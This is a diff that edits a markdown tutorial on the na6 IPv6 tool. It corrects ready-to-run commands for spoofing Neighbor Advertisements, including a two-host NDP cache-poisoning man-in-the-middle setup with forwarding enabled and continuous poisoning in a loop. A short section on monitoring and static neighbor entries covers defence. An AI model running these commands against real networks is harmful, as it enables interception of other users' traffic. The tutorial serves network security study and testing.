@@ -14,24 +14,26 @@ The `na6` tool from the SI6 Networks IPv6 toolkit crafts and sends ICMPv6 Neighb
 
 ```bash
 sudo apt-get install ipv6toolkit   # Debian/Ubuntu
-sudo pacman -S ipv6toolkit          # Arch Linux
+# Arch Linux: install the AUR package named ipv6toolkit, or build from source
 ```
 
 ## Basic na6 Usage
 
 ```bash
-# Send a Neighbor Advertisement from eth0
+# Send a Neighbor Advertisement from eth0 to a specific host
 
-sudo na6 -i eth0
+sudo na6 -i eth0 -d 2001:db8::20 -t 2001:db8::10 -E 00:11:22:33:44:55
 
 # Send an NA claiming to be the owner of a specific address
-sudo na6 -i eth0 -s 2001:db8::victim -d 2001:db8::target
+sudo na6 -i eth0 -s 2001:db8::10 -d 2001:db8::20 -t 2001:db8::10 -E 00:11:22:33:44:55
 
-# -s = source address (the address you're claiming to own)
+# -s = IPv6 source address for the NA packet
 # -d = destination (who receives the NA)
+# -t = target address in the NA (the address you're claiming to own)
+# -E = target link-layer address option (the MAC address advertised for -t)
 
 # Send to all-nodes multicast (affects all hosts on segment)
-sudo na6 -i eth0 -s 2001:db8::gateway -d ff02::1
+sudo na6 -i eth0 -s 2001:db8::1 -d ff02::1 -t 2001:db8::1 -E 00:11:22:33:44:55
 ```
 
 ## NDP Cache Poisoning (MITM Setup)
@@ -40,37 +42,41 @@ To perform a MITM attack by poisoning the NDP cache of two hosts:
 
 ```bash
 # Step 1: Tell Host A that you are the gateway
+# Claim 2001:db8::1 (gateway) to Host A (2001:db8::10)
 sudo na6 -i eth0 \
-  -s 2001:db8::gateway \   # Claim to be the gateway
-  -d 2001:db8::host-a \    # Tell host A
-  -t 2001:db8::gateway \   # Target address in NA
-  --override               # Set Override flag
+  -s 2001:db8::1 \
+  -d 2001:db8::10 \
+  -t 2001:db8::1 \
+  -E 00:11:22:33:44:55 \
+  --override
 
 # Step 2: Tell the gateway that you are Host A
+# Claim 2001:db8::10 (Host A) to the gateway (2001:db8::1)
 sudo na6 -i eth0 \
-  -s 2001:db8::host-a \    # Claim to be Host A
-  -d 2001:db8::gateway \   # Tell the gateway
-  -t 2001:db8::host-a \
+  -s 2001:db8::10 \
+  -d 2001:db8::1 \
+  -t 2001:db8::10 \
+  -E 00:11:22:33:44:55 \
   --override
 
 # Step 3: Enable IPv6 forwarding to pass traffic through
-sudo sysctl -w net.ipv6.conf.eth0.forwarding=1
+sudo sysctl -w net.ipv6.conf.all.forwarding=1
 ```
 
 ## NA Flags
 
 ```bash
 # Set the Router (R) flag
-sudo na6 -i eth0 -s 2001:db8::1 --router-flag
+sudo na6 -i eth0 -d 2001:db8::20 -t 2001:db8::1 -E 00:11:22:33:44:55 --router
 
 # Set the Solicited (S) flag (response to NS)
-sudo na6 -i eth0 -s 2001:db8::1 --solicited-flag
+sudo na6 -i eth0 -d 2001:db8::20 -t 2001:db8::1 -E 00:11:22:33:44:55 --solicited
 
 # Set the Override (O) flag (forces cache update)
-sudo na6 -i eth0 -s 2001:db8::1 --override
+sudo na6 -i eth0 -d 2001:db8::20 -t 2001:db8::1 -E 00:11:22:33:44:55 --override
 
 # All flags combined
-sudo na6 -i eth0 -s 2001:db8::1 --router-flag --solicited-flag --override
+sudo na6 -i eth0 -d 2001:db8::20 -t 2001:db8::1 -E 00:11:22:33:44:55 --router --solicited --override
 ```
 
 ## Target Link-Layer Address (TLLA) Option
@@ -80,9 +86,10 @@ The TLLA option maps an IPv6 address to a MAC address:
 ```bash
 # Spoof the link-layer address in the NA
 sudo na6 -i eth0 \
-  -s 2001:db8::gateway \
+  -s 2001:db8::1 \
   -d ff02::1 \
-  --tlla 00:11:22:33:44:55    # Your attacker MAC
+  -t 2001:db8::1 \
+  -E 00:11:22:33:44:55    # Your attacker MAC
 ```
 
 ## Continuous Poisoning
@@ -91,7 +98,7 @@ NDP cache entries expire; continuous poisoning is needed to maintain the MITM po
 
 ```bash
 # Send NA every 2 seconds (loop mode)
-sudo na6 -i eth0 -s 2001:db8::gateway -d ff02::1 --override --loop --sleep 2
+sudo na6 -i eth0 -s 2001:db8::1 -d ff02::1 -t 2001:db8::1 -E 00:11:22:33:44:55 --override --loop --sleep 2
 ```
 
 ## Monitoring NDP Cache
@@ -116,7 +123,7 @@ watch -n 1 'ip -6 neigh show'
 
 ```bash
 # Create a permanent (static) NDP entry to prevent spoofing
-sudo ip -6 neigh add 2001:db8::gateway \
+sudo ip -6 neigh add 2001:db8::1 \
   lladdr 00:11:22:33:44:55 \
   dev eth0 \
   nud permanent
